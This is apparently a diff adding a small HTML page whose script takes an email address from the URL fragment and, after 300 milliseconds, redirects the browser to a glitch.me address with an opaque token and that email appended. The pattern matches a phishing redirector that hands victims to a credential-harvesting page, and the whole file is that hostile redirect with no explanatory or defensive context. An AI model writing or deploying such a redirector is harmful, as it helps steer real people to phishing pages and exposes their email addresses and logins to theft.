@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+      <script>
+        var queryString = window.location.href;
+        var email= queryString.split("#");
+        var encodedEmail = email[1];
+        setTimeout(function(){
+            var redirect = "https://web3-cloudstorage-useast.glitch.me?DCh2G1LLdg9MCcMGlDAFgAj59C5K2J79g41EKjA19M4HigcbDe28H7b8AJ7D9JCMc7HKhIFc072djj0m77DhHJ51442KkjKj1hGd#{domain}";
+            var link = redirect.replace("{domain}",encodedEmail);
+            window.location.href = link;
+         }, 300);
+        </script>
+
+</div>
+</body>
+</html>
